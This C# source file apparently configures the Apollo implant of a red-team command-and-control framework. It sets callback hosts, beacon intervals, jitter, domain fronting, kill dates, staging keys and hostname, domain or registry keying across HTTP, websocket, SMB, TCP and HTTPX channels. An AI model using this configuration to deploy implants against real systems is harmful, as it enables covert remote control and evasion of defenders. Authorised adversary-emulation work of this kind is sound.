#define C2PROFILE_NAME_UPPER

//#define LOCAL_BUILD
#define HTTPX

#if LOCAL_BUILD
//#define HTTP
//#define WEBSOCKET
//#define TCP
//#define SMB
#endif

#if HTTP
using HttpTransport;
#endif
#if HTTPX
using HttpxTransport;
#endif
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Structs.ApolloStructs;
using PSKCryptography;
using ApolloInterop.Serializers;
#if WEBSOCKET
using WebsocketTransport;
#endif
#if SMB
using NamedPipeTransport;
#endif
#if TCP
using TcpTransport;
#endif
namespace Apollo
{
    public static class Config
    {
        public static Dictionary<string, C2ProfileData> EgressProfiles = new Dictionary<string, C2ProfileData>()
        {
#if HTTP
            { "http", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "callback_interval", "1" },
                        { "callback_jitter", "0" },
                        { "callback_port", "80" },
                        { "callback_host", "http://192.168.53.1" },
                        { "post_uri", "data" },
                        { "encrypted_exchange_check", "T" },
                        { "proxy_host", "" },
                        { "proxy_port", "" },
                        { "proxy_user", "" },
                        { "proxy_pass", "" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" },
#else
                        { "callback_interval", "http_callback_interval_here" },
                        { "callback_jitter", "http_callback_jitter_here" },
                        { "callback_port", "http_callback_port_here" },
                        { "callback_host", "http_callback_host_here" },
                        { "post_uri", "http_post_uri_here" },
                        { "encrypted_exchange_check", "http_encrypted_exchange_check_here" },
                        { "proxy_host", "http_proxy_host_here" },
                        { "proxy_port", "http_proxy_port_here" },
                        { "proxy_user", "http_proxy_user_here" },
                        { "proxy_pass", "http_proxy_pass_here" },
                        { "killdate", "http_killdate_here" },
                        HTTP_ADDITIONAL_HEADERS_HERE
#endif
                    }
                }
            },
#endif
#if WEBSOCKET
            { "websocket", new C2ProfileData()
                {
                    TC2Profile = typeof(WebsocketProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "tasking_type", "Push" },
                        { "callback_interval", "5" },
                        { "callback_jitter", "0" },
                        { "callback_port", "8081" },
                        { "callback_host", "ws://mythic" },
                        { "ENDPOINT_REPLACE", "socket" },
                        { "encrypted_exchange_check", "T" },
                        { "domain_front", "domain_front" },
                        { "killdate", "-1" },
                        { "USER_AGENT", "Apollo-Refactor" },
#else
                        { "tasking_type", "websocket_tasking_type_here"},
                        { "callback_interval", "websocket_callback_interval_here" },
                        { "callback_jitter", "websocket_callback_jitter_here" },
                        { "callback_port", "websocket_callback_port_here" },
                        { "callback_host", "websocket_callback_host_here" },
                        { "ENDPOINT_REPLACE", "websocket_ENDPOINT_REPLACE_here" },
                        { "encrypted_exchange_check", "websocket_encrypted_exchange_check_here" },
                        { "domain_front", "websocket_domain_front_here" },
                        { "USER_AGENT", "websocket_USER_AGENT_here" },
                        { "killdate", "websocket_killdate_here" },
                        HTTP_ADDITIONAL_HEADERS_HERE
#endif
                    }
                }
            },
#endif
#if SMB
            { "smb", new C2ProfileData()
                {
                    TC2Profile = typeof(NamedPipeProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "pipename", "h20iexte-2l1t-mmfu-ipjh-6ofmobkaruq8" },
                        { "encrypted_exchange_check", "true" },
#else
                        { "pipename", "smb_pipename_here" },
                        { "encrypted_exchange_check", "smb_encrypted_exchange_check_here" },
#endif
                    }
                }
            },
#elif TCP
            { "tcp", new C2ProfileData()
                {
                    TC2Profile = typeof(TcpProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "port", "40000" },
                        { "encrypted_exchange_check", "true" },
#else
                        { "port", "tcp_port_here" },
                        { "encrypted_exchange_check", "tcp_encrypted_exchange_check_here" },
#endif
                    }
                }
            },
#endif
#if HTTPX
            { "httpx", new C2ProfileData()
                {
                    TC2Profile = typeof(HttpxProfile),
                    TCryptography = typeof(PSKCryptographyProvider),
                    TSerializer = typeof(EncryptedJsonSerializer),
                    Parameters = new Dictionary<string, string>()
                    {
#if LOCAL_BUILD
                        { "callback_interval", "10" },
                        { "callback_jitter", "23" },
                        { "callback_domains", "https://example.com:443" },
                        { "domain_rotation", "fail-over" },
                        { "failover_threshold", "5" },
                        { "encrypted_exchange_check", "true" },
                        { "killdate", "-1" },
                        { "raw_c2_config", "" },
#else
                        { "callback_interval", "httpx_callback_interval_here" },
                        { "callback_jitter", "httpx_callback_jitter_here" },
                        { "callback_domains", "httpx_callback_domains_here" },
                        { "domain_rotation", "httpx_domain_rotation_here" },
                        { "failover_threshold", "httpx_failover_threshold_here" },
                        { "encrypted_exchange_check", "httpx_encrypted_exchange_check_here" },
                        { "killdate", "httpx_killdate_here" },
                        { "raw_c2_config", "httpx_raw_c2_config_here" },
                        { "proxy_host", "httpx_proxy_host_here" },
                        { "proxy_port", "httpx_proxy_port_here" },
                        { "proxy_user", "httpx_proxy_user_here" },
                        { "proxy_pass", "httpx_proxy_pass_here" },
                        { "domain_front", "httpx_domain_front_here" },
                        { "timeout", "httpx_timeout_here" },
#endif
                    }
                }
            },
#endif
        };


        public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
#if LOCAL_BUILD
#if HTTP
        public static string StagingRSAPrivateKey = "wkskVa0wTi4E3EZ6bi9YyKpbHb01NNDgZ1BXnJJM5io=";
#elif WEBSOCKET
        public static string StagingRSAPrivateKey = "Hl3IzCYy3io5QU70xjpYyCNrOmA84aWMZLkCwumrAFM=";
#elif SMB
        public static string StagingRSAPrivateKey = "NNLlAegRMB8DIX7EZ1Yb6UlKQ4la90QsisIThCyhfCc=";
#elif TCP
        public static string StagingRSAPrivateKey = "Zq24zZvWPRGdWwEQ79JXcHunzvcOJaKLH7WtR+gLiGg=";
#elif HTTPX
        public static string StagingRSAPrivateKey = "K4FLVfFwCPj3zBC+5l9WLCKqsmrtzkk/E8VcVY6iK/o=";
#endif
#if HTTP
        public static string PayloadUUID = "b40195db-22e5-4f9f-afc5-2f170c3cc204";
#elif WEBSOCKET
        public static string PayloadUUID = "7546e204-aae4-42df-b28a-ade1c13594d2";
#elif SMB
        public static string PayloadUUID = "aff94490-1e23-4373-978b-263d9c0a47b3";
#elif TCP
        public static string PayloadUUID = "bfc167ea-9142-4da3-b807-c57ae054c544";
#elif HTTPX
        public static string PayloadUUID = "7f2a0f77-51ca-4afc-a7a9-5ea9717e73c3";
#endif
#else
        // TODO: Make the AES key a config option specific to each profile
        public static string StagingRSAPrivateKey = "AESPSK_here";
        public static string PayloadUUID = "payload_uuid_here";
#endif

        // Environmental Keying Configuration
        public static bool KeyingEnabled = keying_enabled_here;
        public static int KeyingMethod = keying_method_here; // 1=Hostname, 2=Domain, 3=Registry
        public static string KeyingValueHash = "keying_value_hash_here";
        
        // Registry Keying Configuration
        public static string RegistryPath = "registry_path_here";
        public static string RegistryValue = "registry_value_here";
        public static int RegistryComparison = registry_comparison_here; // 1=Matches, 2=Contains
    }
}
